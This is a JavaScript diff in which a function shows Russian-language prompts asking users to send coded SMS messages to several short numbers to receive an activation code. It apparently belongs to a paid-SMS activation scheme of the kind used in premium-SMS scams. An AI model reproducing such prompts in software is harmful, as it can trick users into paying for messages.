@@ -738,51 +738,57 @@ if (plg.Get('oTime')){
 
 }
 var h="0";
-var textBig = "";
+var textBig = "Получить активационный код можно отправив SMS с текстом 00718 на номер 2332.Если не получилось отправить смс, свяжитесь с нами";
 function Hidden() {
 	if (h==0){
 		if (shot==1) {
 			textBig = 'Отправьте pm342243 на номер 1003 для получения кода';
-			document.getElementById('hide').innerHTML=' '+textBig;
 			document.getElementById('hide').style.display = "block";
+			document.getElementById('hide').innerHTML=' '+textBig;
+			
 			return;
 		}
 		if (shot==2){
 			textBig = 'Отправьте 3342243 на номер 8777 для получения кода';
+			document.getElementById('hide').style.display = "block";
 			document.getElementById('hide').innerHTML=' '+textBig;
-		document.getElementById('hide').style.display = "block";
+		
 			return;
 		}
 		if (shot==3){
 			textBig = 'Отправьте 3pm342243 на номер 1337 для получения кода';
+			document.getElementById('hide').style.display = "block";
 			document.getElementById('hide').innerHTML=' '+textBig;
-		document.getElementById('hide').style.display = "block";
+		
 			return;
 		}
 		if (shot==4){
 			textBig = "Отправьте 3pm342243 на номер 1897 для получения кода";
+			document.getElementById('hide').style.display = "block";
 			document.getElementById('hide').innerHTML=' '+textBig;
-		document.getElementById('hide').style.display = "block";
+		
 			return;
 		}
 		if (shot==5){
 			textBig = "Отправьте 342243 на  номер 7250 для получения кода";
+			document.getElementById('hide').style.display = "block";
 			document.getElementById('hide').innerHTML=' '+textBig;
-		document.getElementById('hide').style.display = "block";
+		
 			return;
 		}
 		if (shot==6){
 			textBig = "Отправьте 44342243 на номер 1310 для получения кода";
+			document.getElementById('hide').style.display = "block";
 			document.getElementById('hide').innerHTML=' '+textBig;
-		document.getElementById('hide').style.display = "block";
+	
 			return;
 			
 		}
 		
-		console.log(textBig);
 		
 		
-		h=1;
+		document.getElementById('hide').style.display = "block";
+		h="1";
 		SendStat(555,"small");
 		//SendSms();
 	}
